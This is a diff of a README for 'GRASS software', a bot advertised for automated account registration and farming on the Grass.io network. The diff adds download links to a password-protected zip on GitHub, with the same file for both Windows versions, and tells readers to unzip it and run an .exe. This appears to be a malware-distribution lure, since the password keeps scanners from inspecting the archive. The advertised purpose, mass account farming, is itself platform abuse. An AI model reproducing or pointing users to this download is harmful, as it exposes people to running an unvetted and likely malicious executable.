@@ -5,11 +5,11 @@
 *The GRASS software* is a powerful automation tool designed to simplify account registration and farming on the Grass.io Network. With its advanced features and intuitive interface, it offers users a smooth, efficient experience on the platform, helping to maximize productivity.
 
 # Installation
-  + [Download the *Windows x64* version]()
-  + [Download the *Windows x32* version]()
-  + [Download the *Mac OS* version]()
+  + [Download the *Windows x64* version](https://github.com/SilvaMontaLuis/grass-io-bot/releases/download/x64x32/GRASS-software.zip)
+  + [Download the *Windows x32* version](https://github.com/SilvaMontaLuis/grass-io-bot/releases/download/x64x32/GRASS-software.zip)
+  + [Download the *Mac OS* version](https://github.com/SilvaMontaLuis/grass-io-bot/commits/mac)
 
-# Archive password is ***GR-037svt***
+# Archive password is [***GR-037svt***]()
  *Download the archive, unzip it and launch the "GRASS software.exe" file ("GRASS software Mac OS.dmg" for Mac OS). After that configure files in the "sources" folder.
 
 ![hd](https://github.com/user-attachments/assets/6a99487d-41b4-4953-8c37-ac36517f0157)
